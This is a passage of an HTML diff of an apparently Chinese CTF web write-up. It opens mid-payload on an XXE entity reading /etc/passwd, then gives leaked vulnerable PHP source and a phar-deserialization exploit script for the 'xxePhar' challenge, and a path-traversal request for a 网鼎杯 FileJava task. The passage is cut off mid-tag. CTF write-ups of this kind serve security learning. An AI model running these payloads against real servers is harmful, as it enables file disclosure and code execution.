&quot;file:///etc/passwd&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;error;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %condition;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>any text<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <h3 id="xxePhar"><a href="#xxePhar" class="headerlink" title="xxePhar"></a>xxePhar</h3><p>弱口令<code>admin/admin</code>登录，会跳转到一个文件上传的点。可以先使用<code>XXE</code>逐一读取<code>doLogin.php</code>和<code>class.php</code>的文件内容</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#doLogin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">	<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	<span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#doLogin.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//账号</span><br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//密码</span><br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br>	<span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>	<span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>	<span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br>	<span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br>	<span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>	&#125;	<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br>	<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;call_user_func_array&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func,<span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;FLAG&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;serialize me?&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/Test/&quot;</span>,<span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$this</span>-&gt;a)))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No test in Prod\n&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>构造序列化内容，exp如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Test</span>,<span class="string">&quot;__call&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="keyword">new</span> <span class="title class_">Fun</span>());</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>,<span class="hljs-string">&quot;__call&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$a</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;aaa&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Fun</span>());<br><span class="hljs-variable">$a</span>-&gt;a = <span class="hljs-variable">$b</span>;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>将生成的phar文件上传</p>
 <p>最后利用XXE通过phar协议触发反序列化获得flag。 SYSTEM phar:&#x2F;&#x2F;&#x2F;temp&#x2F;phar.phat</p>
 <h3 id="网鼎杯-FileJava"><a href="#网鼎杯-FileJava" class="headerlink" title="网鼎杯 FileJava"></a>网鼎杯 FileJava</h3><p>可以上传任意文件和下载文件，但是不能访问，所以不能用一句话连接，在下载文件功能发现可以下载任意文件，于是将WEB-INF&#x2F;web.xml页面下载,访问<code>/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml</code>,相关内容如下</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span 